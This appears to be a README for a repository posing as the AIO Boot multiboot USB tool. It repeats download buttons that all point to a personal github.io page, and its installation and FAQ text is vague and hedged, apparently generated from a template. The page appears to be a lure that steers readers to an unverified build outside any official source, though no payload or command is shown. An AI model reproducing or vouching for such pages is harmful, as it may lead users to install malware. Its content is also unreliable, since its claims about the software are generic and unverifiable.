# AIO Boot v23.06.2 - boot media creator 2026

> **AIO Boot v23.06.2 is a boot media creator for Windows and Linux used to assemble and administer multiboot USB drives with UEFI and BIOS support, ISO management, and persistent storage capabilities.**

[![Platform](https://img.shields.io/badge/Platform-Windows%20and%20Linux-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v23.06.2-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/andrew-bennett70/aio-boot-windows-linux?style=flat-square)](https://github.com/andrew-bennett70/aio-boot-windows-linux)

---

<p align="center">
  <a href="https://andrew-bennett70.github.io/aio-boot-windows-linux/">
    <img src="https://img.shields.io/badge/Download-AIO%20Boot%20Latest-brightgreen?style=for-the-badge" alt="Download AIO Boot">
  </a>
</p>

> **[Direct Download - AIO Boot v23.06.2](https://andrew-bennett70.github.io/aio-boot-windows-linux/)**

---

[Download Latest Build](https://andrew-bennett70.github.io/aio-boot-windows-linux/)

---

## Overview

AIO Boot is built for creating bootable USB media that can host multiple operating systems and boot environments in one place. It suits users who want a straightforward way to prepare installation media, recovery drives, or deployment USBs without juggling separate devices for each job.

It works across Windows and Linux workflows and places emphasis on UEFI and BIOS compatibility, ISO organization, and persistent storage support. That makes it a practical option for system builders, IT staff, and advanced users who need a repeatable way to assemble portable boot media for testing, deployment, and maintenance.

---

## Key Capabilities

- Build and maintain multiboot media from a single USB drive
- Works with Windows and Linux boot environments
- Supports both UEFI and BIOS boot modes
- Handles ISO management for boot sources and installation images
- Includes persistent storage support for reusable live environments
- Provides deployment profile validation and verification checks
- Suitable for OS deployment, recovery tasks, and portable installers
- Designed around a boot media creation workflow for desktop and technician use

---

## Installation

Download or clone the repository contents, then place the files in your preferred working folder.

1. Clone the repository:
   - `git clone https://github.com/andrew-bennett70/aio-boot-windows-linux.git
2. Or download the latest build from the project page:
   - [Download Latest Build](https://andrew-bennett70.github.io/aio-boot-windows-linux/)
3. Open the project files on your Windows or Linux system and follow the included launch or setup steps for your environment.

If the repository includes a local launcher, start it from the extracted folder after download. For portable use, keep the project files together so the boot media workflow can access its resources and configuration.

---

## Usage

AIO Boot is generally used to prepare a USB drive, add boot sources, and arrange them into a multiboot layout.

Common workflow:
1. Start the application or tool from the extracted folder.
2. Select the target USB device or working directory.
3. Add ISO images or boot entries for the operating systems you want available.
4. Choose UEFI, BIOS, or dual-mode settings based on the hardware you plan to boot.
5. Enable persistent storage if you want changes to remain across sessions.
6. Validate the deployment profile before writing the final boot media.

Example flow:
- Add a Windows installer ISO
- Add a Linux live image
- Confirm boot mode compatibility
- Save the configuration
- Create the multiboot USB device

---

## Configuration

Setup is controlled through the project settings and the boot media layout used during installation. If the project keeps options in local files, leave them beside the application folder so the media creation process can read them reliably.

Typical settings to review include:
- Boot mode selection for UEFI, BIOS, or both
- ISO source paths
- Persistent storage size and behavior
- Deployment profile validation options

Example structure:

    boot_mode: uefi+bios
    iso_sources:
      - path: ./iso/windows.iso
      - path: ./iso/linux.iso
    persistent_storage: enabled

---

## Requirements

- Windows or Linux host system
- A USB drive or other removable storage for boot media creation
- ISO images or boot sources to add to the multiboot setup
- Sufficient free space for images and persistent storage
- A system that supports the selected boot mode, such as UEFI, BIOS, or both

---

## FAQ

**Does it support both Windows and Linux media?**  
Yes, the profile indicates support for Windows and Linux boot environments.

**Can it work with UEFI and BIOS machines?**  
Yes, dual-mode boot support is included.

**Can I keep data between sessions?**  
Persistent storage support is available for setups that need it.

**Where do I change settings?**  
Check the project files or local configuration used during setup, and keep related files in the same working folder.

**What should I do if a deployment check fails?**  
Review the selected ISO sources, boot mode settings, and profile options, then run validation again before writing the media.

**How do I get updates?**  
Use the latest build link above or check the repository for the current release files.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
